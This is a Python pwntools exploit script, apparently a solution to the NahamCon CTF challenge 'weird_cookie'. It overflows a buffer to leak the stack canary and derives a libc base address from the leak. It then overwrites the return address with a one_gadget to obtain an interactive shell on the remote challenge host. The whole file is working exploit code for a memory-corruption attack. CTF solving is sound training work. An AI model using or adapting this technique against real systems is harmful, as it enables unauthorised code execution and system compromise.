#!/usr/bin/env python3

from pwn import *

exe = ELF("./weird_cookie_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")
context.terminal= ['tmux']
context.binary = exe

gs = """
b* main+221
c
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r,gdb_scripts=gs)
    else:
        r = remote('challenge.nahamcon.com',31800)

    return r


def main():
    r = conn()

    r.sendafter(b'?\n', 40*b'A')
    leak = r.recvline()
    leak = leak[40:48]
    
    canary =  u64(leak.ljust(8, b'\x00'))
    log.info('canary ' + hex(canary))
    
    printf = canary ^ 0x123456789abcdef1	
    
    libc.address= printf - libc.sym['printf']
    log.info('libc_base ' + hex(libc.address))
    
    ret = 0x00000000000008aa + libc.address
    one_gagdet = libc.address + 0x4f2a5 
    payload = 40*b'A' + p64(canary) + p64(0)+ p64(one_gagdet)
    
    assert len(payload) == 64
    
    r.send(payload)
    r.interactive()


if __name__ == "__main__":
    main()
